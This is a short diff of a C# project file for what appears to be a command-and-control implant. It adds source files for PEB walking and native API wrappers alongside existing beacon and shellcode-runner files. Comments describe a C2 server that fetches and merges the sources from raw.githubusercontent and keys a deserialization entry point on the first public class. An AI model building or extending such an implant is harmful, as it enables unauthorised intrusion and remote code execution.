@@ -87,11 +87,17 @@
     <!-- Order matters to the C2: it fetches these paths (raw.githubusercontent, branch main)
          and merges them in order — Program.cs holds the FIRST public class, which the
          deserialization entry machinery keys on. -->
+    <Compile Include="src\PebWalker.cs" />
+    <Compile Include="src\NtdllApi.cs" />
+    <Compile Include="src\Kernel.cs" />
+    <Compile Include="src\AdvApi.cs" />
+    <Compile Include="src\User32.cs" />
     <Compile Include="src\Program.cs" />
     <Compile Include="src\Beacon.cs" />
     <Compile Include="src\Identity.cs" />
     <Compile Include="src\NativeInterop.cs" />
     <Compile Include="src\ShellcodeRunner.cs" />
+
     <!-- LAST and internal: the entry finder keys on the first PUBLIC type, and the
          diagnostic MessageBox helper must never be reachable as one. -->
     <Compile Include="src\Diag.cs" />
